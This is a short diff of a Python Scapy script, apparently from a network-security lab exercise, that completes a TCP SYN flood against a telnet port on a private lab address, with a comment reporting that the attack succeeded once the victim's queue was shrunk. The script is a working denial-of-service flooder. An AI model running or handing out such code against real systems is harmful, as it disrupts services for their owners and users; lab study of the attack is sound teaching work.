@@ -5,7 +5,7 @@ from ipaddress import IPv4Address
 from random import getrandbits
 
 ip = IP(dst="10.9.0.5")
-tcp = TCP(dport=23, flags='S')   # TO BE COMPLETED
+tcp = TCP(dport=23, flags='S')
 pkt = ip/tcp
 
 while True:
@@ -13,3 +13,5 @@ while True:
     pkt[TCP].sport = getrandbits(16)                 # source port
     pkt[TCP].seq = getrandbits(32)                   # sequence number
     send(pkt, verbose = 0)
+
+# using just one attacker instance, but reducing the size of the victim queue to 100, the attack is successfull
